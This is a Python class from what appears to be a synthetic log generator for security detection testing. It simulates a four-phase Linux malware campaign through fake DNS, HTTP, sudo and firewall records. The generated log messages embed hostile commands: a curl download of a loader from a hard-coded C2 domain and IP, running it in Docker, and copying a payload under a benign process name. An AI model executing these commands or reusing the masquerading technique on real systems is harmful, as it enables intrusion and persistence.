from __future__ import annotations

from datetime import datetime

from ..formatters.json_fmt import JSONFormatter
from ..formatters.syslog_fmt import CiscoASAFormatter, SyslogFormatter
from ..topology import Topology
from .base import BaseCampaign

BENIGN_NAMES = ["sshd", "systemd", "rsyslogd", "crond", "python3", "NetworkManager"]
BITTORRENT_PORTS = [6881, 6882, 6889, 6969, 51413]


class PeerTimeCampaign(BaseCampaign):
    def __init__(self, topology: Topology) -> None:
        super().__init__(topology)
        self.syslog_fmt = SyslogFormatter()
        self.asa_fmt = CiscoASAFormatter()
        self.json_fmt = JSONFormatter()
        self._victim = topology.random_linux_host()

    @property
    def total_phases(self) -> int:
        return 4

    def generate(self, ts: datetime) -> dict[str, list[str]]:
        phase = self.advance_phase()
        if phase == 0:
            return self._initial_download(ts)
        elif phase == 1:
            return self._docker_check(ts)
        elif phase == 2:
            return self._p2p_beacon(ts)
        else:
            return self._payload_deploy(ts)

    def _pick_domain(self):
        return self.rng.choice(self.topo.peertime_domains) if self.topo.peertime_domains else "bloopencil.net"

    def _pick_c2_ip(self):
        return self.rng.choice(self.topo.peertime_ips) if self.topo.peertime_ips else "185.196.10.247"

    def _initial_download(self, ts):
        domain = self._pick_domain()
        staging_ip = self._pick_c2_ip()
        host = self._victim
        domain_prefix = domain.split(".")[0]

        dns_data = {
            "host_addr": [staging_ip],
            "message_type": ["QUERY", "RESPONSE"],
            "name": [domain],
            "query": [domain],
            "query_type": ["A"],
            "reply_code": "NoError",
            "reply_code_id": 0,
            "response_time": self.rng.randint(5000, 20000),
            "transaction_id": self.rng.randint(1000, 65535),
            "ttl": [300],
            "bytes": self.rng.randint(80, 200),
            "src_ip": host.ip,
            "src_port": self.topo.random_ephemeral_port(),
            "bytes_in": 40,
            "dest_ip": self.topo.dns_server_ip,
            "dest_port": 53,
            "bytes_out": self.rng.randint(60, 150),
            "time_taken": self.rng.randint(5000, 20000),
            "transport": "udp",
            "flow_id": self.topo.random_guid(),
            "protocol_stack": "ip:udp:dns",
        }
        dns_line = self.json_fmt.format(ts, data=dns_data)

        http_lines = []
        for path in ["/loader", "/instrumentor"]:
            data = {
                "bytes": self.rng.randint(50000, 500000),
                "src_ip": host.ip,
                "src_port": self.topo.random_ephemeral_port(),
                "bytes_in": self.rng.randint(200, 500),
                "dest_ip": staging_ip,
                "dest_port": 443,
                "bytes_out": self.rng.randint(50000, 500000),
                "time_taken": self.rng.randint(100000, 500000),
                "transport": "tcp",
                "flow_id": self.topo.random_guid(),
                "http_method": "GET",
                "status": 200,
                "uri_path": path,
                "site": domain,
                "http_user_agent": "curl/7.81.0",
                "http_content_type": "application/octet-stream",
                "http_comment": "HTTP/1.1 200 OK",
                "server": "nginx",
                "protocol_stack": "ip:tcp:http",
            }
            http_lines.append(self.json_fmt.format(ts, data=data))

        pid = self.rng.randint(1000, 65000)
        sudo_line = self.syslog_fmt.format(
            ts, hostname=host.hostname, process="sudo", pid=pid,
            message=f"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.cache/{domain_prefix} https://{domain}/loader",
        )

        fw = self.topo.random_firewall()
        asa_line = self.asa_fmt.format(
            ts, hostname=fw.hostname, severity=6, message_id="302013",
            message=(
                f"Built outbound TCP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{staging_ip}/443 ({staging_ip}/443)"
            ),
        )

        return {"dns": [dns_line], "http": http_lines, "linux_secure": [sudo_line], "cisco:asa": [asa_line]}

    def _docker_check(self, ts):
        host = self._victim
        pid = self.rng.randint(1000, 65000)

        lines = [
            self.syslog_fmt.format(ts, hostname=host.hostname, process="sudo", pid=pid,
                                   message=f"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/docker --version"),
            self.syslog_fmt.format(ts, hostname=host.hostname, process="sudo", pid=pid,
                                   message=f"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/docker run --rm -v /tmp/.cache:/mnt alpine /mnt/loader"),
            self.syslog_fmt.format(ts, hostname=host.hostname, process="sshd", pid=pid + 1,
                                   message="pam_unix(sshd:session): session opened for user root"),
        ]

        return {"linux_secure": lines}

    def _p2p_beacon(self, ts):
        domain = self._pick_domain()
        c2_ip = self._pick_c2_ip()
        host = self._victim
        bt_port = self.rng.choice(BITTORRENT_PORTS)

        dns_data = {
            "host_addr": [c2_ip],
            "message_type": ["QUERY", "RESPONSE"],
            "name": [domain],
            "query": [domain],
            "query_type": ["A"],
            "reply_code": "NoError",
            "reply_code_id": 0,
            "response_time": self.rng.randint(5000, 20000),
            "transaction_id": self.rng.randint(1000, 65535),
            "ttl": [120],
            "bytes": self.rng.randint(80, 200),
            "src_ip": host.ip,
            "src_port": self.topo.random_ephemeral_port(),
            "bytes_in": 40,
            "dest_ip": self.topo.dns_server_ip,
            "dest_port": 53,
            "bytes_out": self.rng.randint(60, 150),
            "time_taken": self.rng.randint(5000, 20000),
            "transport": "udp",
            "flow_id": self.topo.random_guid(),
            "protocol_stack": "ip:udp:dns",
        }
        dns_line = self.json_fmt.format(ts, data=dns_data)

        fw = self.topo.random_firewall()
        asa_lines = [
            self.asa_fmt.format(ts, hostname=fw.hostname, severity=6, message_id="302015",
                                message=(
                                    f"Built outbound UDP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                                    f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{c2_ip}/{bt_port} ({c2_ip}/{bt_port})"
                                )),
            self.asa_fmt.format(ts, hostname=fw.hostname, severity=6, message_id="302013",
                                message=(
                                    f"Built outbound TCP connection {fw.next_conn_id()} for inside:{host.ip}/{self.topo.random_ephemeral_port()} "
                                    f"({host.ip}/{self.topo.random_ephemeral_port()}) to outside:{c2_ip}/{bt_port} ({c2_ip}/{bt_port})"
                                )),
        ]

        return {"dns": [dns_line], "cisco:asa": asa_lines}

    def _payload_deploy(self, ts):
        host = self._victim
        pid = self.rng.randint(1000, 65000)
        domain = self._pick_domain()
        domain_prefix = domain.split(".")[0]
        benign_name = self.rng.choice(BENIGN_NAMES)

        lines = [
            self.syslog_fmt.format(ts, hostname=host.hostname, process="sudo", pid=pid,
                                   message=f"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/busybox cp /tmp/.cache/payload /usr/local/bin/{benign_name}"),
            self.syslog_fmt.format(ts, hostname=host.hostname, process="sudo", pid=pid,
                                   message=f"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/chmod +x /usr/local/bin/{benign_name}"),
            self.syslog_fmt.format(ts, hostname=host.hostname, process="sudo", pid=pid,
                                   message=f"root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/local/bin/{benign_name}"),
        ]

        return {"linux_secure": lines}
